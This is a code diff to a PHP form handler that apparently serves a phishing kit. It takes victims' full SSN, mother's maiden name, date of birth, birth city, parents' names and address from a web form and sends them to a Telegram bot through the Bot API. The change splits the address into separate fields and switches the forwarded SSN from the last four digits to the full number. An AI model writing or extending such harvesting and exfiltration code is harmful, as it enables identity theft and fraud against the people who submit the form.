@@ -30,7 +30,13 @@ $dob = $_POST['dob'];
 $mother_maiden = $_POST['mother_maiden'];
 $ssn = $_POST['ssn'];
 $birth_city = $_POST['birth_city'];
-$address = $_POST['address'];
+$address_line1 = $_POST['address_line1'];
+$address_line2 = $_POST['address_line2'];
+$city = $_POST['city'];
+$state = $_POST['state'];
+$zip_code = $_POST['zip_code'];
+
+$address = $address_line1 . " " . $address_line2 . ", " . $city . ", " . $state . " " . $zip_code;
 $father_name = $_POST['father_name'];
 $mother_name = $_POST['mother_name'];
 
@@ -93,11 +99,11 @@ $text = "📄 New Application Submitted\n\n"
 . "📞 Phone: $phone\n"
 . "📧 Email: $email\n"
 . "🎂 DOB: $dob\n"
-. "🏠 Address: $address\n"
+. "🏠 Address: $address_line1 $address_line2, $city, $state $zip_code\n"
 . "🏙 Birth City: $birth_city\n"
 . "👨 Father: $father_name\n"
 . "👩 Mother: $mother_name\n"
-. "🧾 SSN (last 4): $ssn";
+. "🧾 SSN: $ssn";
 
 file_get_contents(
     "https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
